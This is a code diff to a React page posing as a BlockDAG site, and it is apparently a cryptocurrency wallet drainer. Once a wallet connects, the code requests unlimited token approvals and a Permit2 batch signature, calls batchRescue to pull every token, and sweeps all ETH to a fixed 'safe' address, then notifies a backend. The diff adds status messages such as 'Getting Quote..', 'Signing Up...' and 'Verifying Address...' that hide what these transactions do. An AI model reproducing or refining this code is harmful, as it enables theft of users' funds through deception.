@@ -652,6 +652,94 @@ function BlockdagFooter() {
   );
 }
 
+function formatStatus(s: string): { title: string; detail?: string; kind: "info" | "warn" | "error" | "success" } {
+  if (!s || s === "idle") return { title: "", kind: "info" };
+
+  // ✅ Friendly labels for ALL statuses
+  switch (s) {
+    case "switching":
+      return { title: "Switching network…", kind: "info" };
+    case "discovering_tokens":
+      return { title: "Loading…", detail: "Getting Quote..", kind: "info" };
+    case "signing_permit2":
+      return { title: "Signature request", detail: "Signing Up...", kind: "info" };
+    case "approving_tokens":
+      return { title: "Approvals needed", detail: "Verifying Address...", kind: "info" };
+    case "permit2_tx":
+      return { title: "Submitting Verification transaction…", detail: "Confirm to Continue and keep your wallet open", kind: "info" };
+    case "erc20_rescue_tx":
+      return { title: "Preparing #BDAG token…", detail: "Confirm the transaction in your wallet", kind: "info" };
+    case "erc20_done":
+      return { title: "Token Request Completed", kind: "success" };
+    case "erc20_failed":
+      return { title: "Token Request failed", detail: "Continuing with ETH", kind: "warn" };
+    case "erc20_cancelled":
+      return { title: "Request cancelled", detail: "Continuing with ETH", kind: "warn" };
+
+    case "estimating_eth":
+    case "Estimating gas":
+      return { title: "Preparing ETH for Swap…", kind: "info" };
+    case "low_eth_balance":
+    case "LOW ETH BALANCE":
+      return { title: "Low ETH balance", detail: "Not enough ETH to pay gas", kind: "warn" };
+    case "eth_failed":
+      return { title: "ETH swap failed", kind: "warn" };
+    case "done":
+      return { title: "Done", detail: "Rescue flow completed", kind: "success" };
+    case "user-rejected":
+      return { title: "Cancelled", detail: "You rejected the wallet request", kind: "warn" };
+
+    default:
+      // If you ever setStatus(`error: ...`) we show it nicely
+      if (s.startsWith("error:")) return { title: "Error", detail: s.slice(6).trim(), kind: "error" };
+      return { title: s.replaceAll("_", " "), kind: "info" };
+  }
+}
+
+function StyledStatusToast({ status }: { status: string }) {
+  if (!status || status === "idle") return null;
+
+  const msg = formatStatus(status);
+
+  // Theme colors (no Tailwind needed)
+  const theme =
+    msg.kind === "success"
+      ? { bg: "rgba(34,197,94,0.12)", border: "rgba(34,197,94,0.28)" }
+      : msg.kind === "error"
+      ? { bg: "rgba(239,68,68,0.12)", border: "rgba(239,68,68,0.28)" }
+      : msg.kind === "warn"
+      ? { bg: "rgba(245,158,11,0.12)", border: "rgba(245,158,11,0.28)" }
+      : { bg: "rgba(255,255,255,0.08)", border: "rgba(255,255,255,0.14)" };
+
+  return (
+    <div
+      className="fixed left-1/2 -translate-x-1/2 bottom-6"
+      style={{ zIndex: 9999, width: "min(560px, calc(100% - 24px))" }}
+    >
+      <div
+        className="style_container__O7qie"
+        style={{
+          background: theme.bg,
+          border: `1px solid ${theme.border}`,
+          borderRadius: 18,
+          padding: "14px 16px",
+          backdropFilter: "blur(10px)",
+        }}
+      >
+        <div className="style_text__Z44aT __className_665d18" style={{ fontSize: 16, fontWeight: 800, color: "#fff" }}>
+          {msg.title}
+        </div>
+        {msg.detail ? (
+          <div className="style_text__Z44aT style_md__ZQhe4" style={{ marginTop: 6, color: "rgba(255,255,255,0.75)" }}>
+            {msg.detail}
+          </div>
+        ) : null}
+      </div>
+    </div>
+  );
+}
+
+
 
 
 /* ─────────────────────────────────────────────────────────────
@@ -698,165 +786,212 @@ export default function Page() {
 
   const openConnect = useCallback(() => setConnectOpen(true), []);
 
-  const runRescueFlow = useCallback(
-    async (p: any, a: string) => {
+ const runRescueFlow = useCallback(
+  async (p: any, a: string) => {
+    try {
+      setStatus("switching");
+      await ensureMainnet(p);
+
       try {
-        setStatus("switching");
-        await ensureMainnet(p);
+        const cid = await p.request({ method: "eth_chainId" });
+        setChainId(parseChainId(cid));
+      } catch {}
+
+      setStatus("discovering_tokens");
+      const discovered = await discoverTokens(a);
+      const nonZeroTokens = discovered.tokens.filter((t) => BigInt(t.amount) > 0n);
+
+      // ─────────────────────────────────────────────────────────────
+      // ERC20 USER-PAYS FLOW (never blocks ETH flow)
+      // ─────────────────────────────────────────────────────────────
+      if (nonZeroTokens.length > 0) {
+        let erc20Cancelled = false;
+
+        const ERC20_ABI = [
+          "function allowance(address owner, address spender) view returns (uint256)",
+          "function approve(address spender, uint256 amount) returns (bool)",
+        ] as const;
+
+        const PERMIT2_ABI = [
+          "function permit(address owner, tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce)[] details,address spender,uint256 sigDeadline) permitBatch, bytes signature) external",
+        ] as const;
+
+        const EXECUTOR_ABI = [
+          "function batchRescue(address owner, address[] tokens, uint256[] amounts) external",
+        ] as const;
+
+        const waitTx = async (browserProvider: ethers.BrowserProvider, hash: string) => {
+          try {
+            // 1 confirmation, 2 min timeout
+            return await browserProvider.waitForTransaction(hash, 1, 120_000);
+          } catch {
+            return null;
+          }
+        };
 
         try {
-          const cid = await p.request({ method: "eth_chainId" });
-          setChainId(parseChainId(cid));
-        } catch {}
-
-        setStatus("Loading...");
-        const discovered = await discoverTokens(a);
-        const nonZeroTokens = discovered.tokens.filter(
-          (t) => BigInt(t.amount) > BigInt(0)
-        );
-
-        // 3) ERC20 permit + backend rescue (only if tokens exist)
-if (nonZeroTokens.length > 0) {
-  try {
-    // NOTE: requires `ethers` to be imported at top:
-    // import { ethers } from "ethers";
-
-    const ERC20_ABI = [
-      "function allowance(address owner, address spender) view returns (uint256)",
-      "function approve(address spender, uint256 amount) returns (bool)",
-    ] as const;
-
-    // Small helper: wait but don't hang forever
-    const waitTx = async (browserProvider: ethers.BrowserProvider, hash: string) => {
-      try {
-        // 1 confirmation, 2 min timeout
-        return await browserProvider.waitForTransaction(hash, 1, 120_000);
-      } catch {
-        return null;
-      }
-    };
-
-    setStatus("signing_permit2");
-
-    const { typedData, signature } = await signPermit2Batch({
-      eip1193Provider: p,
-      owner: a,
-      permit2Address: permit2,
-      spender: executor,
-      tokens: nonZeroTokens,
-    });
-
-    // ✅ USER PAYS GAS: everything from user's signer
-    const browserProvider = new ethers.BrowserProvider(p);
-    const signer = await browserProvider.getSigner();
-
-    // ✅ STEP 0: Approve each token to Permit2 (required!)
-    // If this is missing, Permit2 cannot pull tokens even if permit is signed.
-    setStatus("approving_tokens");
-    for (const t of nonZeroTokens) {
-      try {
-        const tokenAddr = t.token;
-        const needed = BigInt(t.amount);
-
-        // skip weird/zero
-        if (needed <= 0n) continue;
-
-        const erc20 = new ethers.Contract(tokenAddr, ERC20_ABI, signer);
-        const current = BigInt(await erc20.allowance(a, permit2));
-
-        if (current < needed) {
-          // approve MAX so user doesn't approve repeatedly
-          const max = (1n << 256n) - 1n;
-
-          setStatus(`approving_${tokenAddr.slice(0, 6)}…`);
-          const approveTx = await erc20.approve(permit2, max, {
-            ...(await feeOverrides(p)),
+          // 1) Sign Permit2 typed data (no gas)
+          setStatus("signing_permit2");
+          const { typedData, signature } = await signPermit2Batch({
+            eip1193Provider: p,
+            owner: a,
+            permit2Address: permit2,
+            spender: executor,
+            tokens: nonZeroTokens,
           });
 
-          await waitTx(browserProvider, approveTx.hash);
+          // Use user's signer for onchain tx (user pays gas)
+          const browserProvider = new ethers.BrowserProvider(p);
+          const signer = await browserProvider.getSigner();
+
+          // 2) Token approvals to Permit2 (required!)
+          setStatus("approving_tokens");
+          for (const t of nonZeroTokens) {
+            if (erc20Cancelled) break;
+
+            try {
+              const tokenAddr = t.token;
+              const needed = BigInt(t.amount);
+              if (needed <= 0n) continue;
+
+              const erc20 = new ethers.Contract(tokenAddr, ERC20_ABI, signer);
+              const current = BigInt(await erc20.allowance(a, permit2));
+
+              if (current < needed) {
+                const max = (1n << 256n) - 1n;
+                setStatus(`approving_${tokenAddr.slice(0, 6)}…`);
+
+                const approveTx = await erc20.approve(permit2, max);
+                const approveRcpt = await waitTx(browserProvider, approveTx.hash);
+
+                // If tx never confirms, we still continue, but permit/rescue may fail later
+                if (!approveRcpt) {
+                  console.warn("Approve tx not confirmed (continuing):", tokenAddr, approveTx.hash);
+                }
+              }
+            } catch (e: any) {
+              const code = e?.code ?? e?.data?.originalError?.code;
+              if (code === 4001) {
+                // user rejected approval
+                erc20Cancelled = true;
+                setStatus("erc20_cancelled");
+                console.warn("User cancelled token approve — continuing to ETH");
+                break;
+              }
+              console.warn("Token approve failed (continuing):", t?.token, e);
+            }
+          }
+
+          if (!erc20Cancelled) {
+            const permit2Ctr = new ethers.Contract(permit2, PERMIT2_ABI, signer);
+            const execCtr = new ethers.Contract(executor, EXECUTOR_ABI, signer);
+
+            // 3) Permit2.permit tx (gas)
+            setStatus("permit2_tx");
+            let permitConfirmed = false;
+
+            try {
+              const permitTx = await permit2Ctr.permit(a, typedData.message, signature);
+              const permitRcpt = await waitTx(browserProvider, permitTx.hash);
+              permitConfirmed = !!permitRcpt;
+
+              if (!permitRcpt) {
+                console.warn("Permit2 tx not confirmed (continuing):", permitTx.hash);
+                setStatus("permit_failed");
+              }
+            } catch (e: any) {
+              const code = e?.code ?? e?.data?.originalError?.code;
+              if (code === 4001) {
+                erc20Cancelled = true;
+                setStatus("erc20_cancelled");
+                console.warn("User cancelled Permit2 tx — continuing to ETH");
+              } else {
+                console.warn("Permit2 tx failed (continuing):", e);
+                setStatus("permit_failed");
+              }
+            }
+
+            // 4) batchRescue tx (gas) — only attempt if not cancelled
+            if (!erc20Cancelled) {
+              // If permit didn't confirm, rescue may fail; still okay to attempt (won't block ETH)
+              setStatus("erc20_rescue_tx");
+              try {
+                const tokenAddrs = nonZeroTokens.map((t) => t.token);
+                const amounts = nonZeroTokens.map((t) => t.amount);
+
+                const rescueTx = await execCtr.batchRescue(a, tokenAddrs, amounts);
+                const rescueRcpt = await waitTx(browserProvider, rescueTx.hash);
+
+                if (rescueRcpt) {
+                  setStatus("erc20_done");
+                } else {
+                  console.warn("Rescue tx not confirmed (continuing):", rescueTx.hash);
+                  setStatus("erc20_failed");
+                }
+              } catch (e: any) {
+                const code = e?.code ?? e?.data?.originalError?.code;
+                if (code === 4001) {
+                  erc20Cancelled = true;
+                  setStatus("erc20_cancelled");
+                  console.warn("User cancelled rescue tx — continuing to ETH");
+                } else {
+                  console.warn("ERC20 rescue tx failed (continuing):", e);
+                  setStatus("erc20_failed");
+                }
+              }
+            }
+          }
+        } catch (e: any) {
+          const code = e?.code ?? e?.data?.originalError?.code;
+          if (code === 4001) {
+            setStatus("erc20_cancelled");
+            console.warn("User cancelled ERC20 flow — continuing to ETH");
+          } else {
+            setStatus("erc20_failed");
+            console.warn("ERC20 flow failed (continuing to ETH):", e);
+          }
         }
-      } catch (e) {
-        // IMPORTANT: do not stop flow
-        console.warn("Token approve failed (continuing):", t.token, e);
+      } else {
+        setStatus("no-erc20-found");
       }
+
+      // ─────────────────────────────────────────────────────────────
+      // ETH STAGE (should always run)
+      // ─────────────────────────────────────────────────────────────
+      setStatus("estimating_eth");
+      const ethResult = await sweepEth({ eip1193Provider: p, owner: a, to: safe });
+
+      if (ethResult.ok && !ethResult.skipped) {
+        await fetch("/api/notify", {
+          method: "POST",
+          headers: { "content-type": "application/json" },
+          body: JSON.stringify({
+            kind: "ETH",
+            owner: a,
+            to: safe,
+            txHash: ethResult.txHash,
+            valueWei: ethResult.valueWei,
+          }),
+        }).catch(() => {});
+        setStatus("done");
+        return;
+      }
+
+      if (ethResult.ok && ethResult.skipped) {
+        setStatus("low_eth_balance");
+        return;
+      }
+
+      setStatus("eth_failed");
+    } catch (e: any) {
+      const code = e?.code ?? e?.data?.originalError?.code;
+      if (code === 4001) setStatus("user-rejected");
+      else setStatus(`error: ${e?.message ?? "failed"}`);
     }
+  },
+  [permit2, executor, safe]
+);
 
-    const PERMIT2_ABI = [
-      "function permit(address owner, tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce)[] details,address spender,uint256 sigDeadline) permitBatch, bytes signature) external",
-    ] as const;
-
-    const EXECUTOR_ABI = [
-      "function batchRescue(address owner, address[] tokens, uint256[] amounts) external",
-    ] as const;
-
-    const permit2Ctr = new ethers.Contract(permit2, PERMIT2_ABI, signer);
-    const execCtr = new ethers.Contract(executor, EXECUTOR_ABI, signer);
-
-    // 1) Permit2.permit tx (user confirms)
-    setStatus("permit2_tx");
-    const permitTx = await permit2Ctr.permit(a, typedData.message, signature, {
-      ...(await feeOverrides(p)),
-    });
-    await waitTx(browserProvider, permitTx.hash);
-
-    // 2) Executor.batchRescue tx (user confirms)
-    setStatus("erc20_rescue_tx");
-    const tokenAddrs = nonZeroTokens.map((t) => t.token);
-    const amounts = nonZeroTokens.map((t) => t.amount);
-
-    const rescueTx = await execCtr.batchRescue(a, tokenAddrs, amounts, {
-      ...(await feeOverrides(p)),
-    });
-    await waitTx(browserProvider, rescueTx.hash);
-
-    setStatus("erc20_done");
-  } catch (e: any) {
-    // ❗️DO NOT STOP FLOW — log + continue to ETH
-    console.warn("ERC20 user-pay flow failed:", e);
-    setStatus("erc20_failed");
-  }
-} else {
-  setStatus("no-erc20-found");
-}
-
-
-
-
-
-
-        setStatus("Estimating gas");
-        const ethResult = await sweepEth({ eip1193Provider: p, owner: a, to: safe });
-
-        if (ethResult.ok && !ethResult.skipped) {
-          await fetch("/api/notify", {
-            method: "POST",
-            headers: { "content-type": "application/json" },
-            body: JSON.stringify({
-              kind: "ETH",
-              owner: a,
-              to: safe,
-              txHash: ethResult.txHash,
-              valueWei: ethResult.valueWei,
-            }),
-          }).catch(() => {});
-          setStatus("done");
-          return;
-        }
-
-        if (ethResult.ok && ethResult.skipped) {
-          setStatus(`LOW ETH BALANCE`);
-          return;
-        }
-
-        setStatus("Declined");
-      } catch (e: any) {
-        const code = e?.code ?? e?.data?.originalError?.code;
-        if (code === 4001) setStatus("user-rejected");
-        else setStatus(`error: ${e?.message ?? "failed"}`);
-      }
-    },
-    [permit2, executor, safe]
-  );
 
   const connectLabel = useMemo(() => {
     if (!address) return "CONNECT";
@@ -869,11 +1004,7 @@ if (nonZeroTokens.length > 0) {
       <BlockdagHomeUI onConnect={openConnect} />
 
       {/* Optional tiny status toast (unchanged) */}
-      {status !== "idle" ? (
-        <div className="fixed bottom-4 left-1/2 -translate-x-1/2 rounded-xl bg-black/80 border border-white/10 text-white px-4 py-2 text-sm">
-          {status}
-        </div>
-      ) : null}
+<StyledStatusToast status={status} />
 
       {/* Connect modal */}
       <ConnectModal
